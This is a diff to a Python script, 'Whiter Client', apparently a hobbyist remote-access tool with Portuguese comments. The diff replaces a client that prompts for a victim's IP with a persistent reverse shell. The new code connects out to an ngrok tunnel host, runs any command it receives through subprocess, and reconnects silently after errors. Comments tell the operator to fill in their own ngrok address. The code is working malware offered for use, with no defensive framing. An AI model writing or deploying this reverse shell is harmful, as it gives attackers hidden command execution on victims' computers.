@@ -1,34 +1,40 @@
-# By Dragonmodder (Jhon) - Whiter Client V0.1
-
 import socket
+import subprocess
+import os
 
-print("""
+HOST = '0.tcp.ngrok.io'  # TROCA PELO SEU IP DO NGROK
+PORT = 12345             # TROCA PELA PORTA DO NGROK
+
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((HOST, PORT))
+            banner = """
 ██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
 ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
 ██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
 ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
 ╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
+        W H I T E R   C L I E N T   V2.1 By Jhon
+"""
+            s.send(banner.encode())
+            while True:
+                comando = s.recv(1024).decode()
+                if comando.lower() == 'exit':
+                    break
+                elif comando.startswith('cd '):
+                    try:
+                        os.chdir(comando[3:])
+                        s.send(f"[+] Diretório: {os.getcwd()}".encode())
+                    except Exception as e:
+                        s.send(f"[!] Erro: {str(e)}".encode())
+                else:
+                    resultado = subprocess.getoutput(comando)
+                    s.send(resultado.encode() if resultado else b'[+] Executado.')
+            s.close()
+        except:
+            continue
 
-       W H I T E R   C L I E N T   V0.1
-""")
-
-HOST = input("IP da vítima: ").strip()
-PORT = 4444
-
-cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cliente.connect((HOST, PORT))
-
-print('[+] Conectado. Comandos: cd, webcam, exit, etc.')
-
-while True:
-    comando = input('Whiter@client> ')
-    if comando.strip() == "":
-        continue
-    cliente.send(comando.encode())
-    if comando.lower() == 'exit':
-        break
-    resposta = cliente.recv(4096).decode()
-    print(resposta)
-
-cliente.close()
+connect()
